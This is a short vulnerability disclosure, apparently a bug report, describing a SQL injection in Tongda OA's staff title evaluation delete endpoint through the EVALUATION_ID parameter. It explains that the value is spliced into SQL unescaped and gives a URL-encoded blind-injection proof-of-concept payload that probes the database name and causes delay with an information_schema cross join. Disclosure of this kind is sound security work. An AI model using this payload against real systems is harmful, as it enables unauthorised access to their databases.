SQL injection vulnerability exists in tongda oa

version:v2017 version and versions below v11.10

Route: general/hr/manage/staff_title_evaluation/delete.php

There is an injected parameter: $EVALUATION_ID

The code here is very simple. When $EVALUATION_ID is not empty, the parameters are directly spliced ​​into the SQL statement. Since the brackets are closed here, there is a bypass.

![图片1](https://github.com/csbsong/bug_report/assets/127068468/c97376f6-ed3d-41d5-9002-5b61032f425f)

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![图片2](https://github.com/csbsong/bug_report/assets/127068468/1b0b6797-8982-41f2-b5ae-52a749a27342)
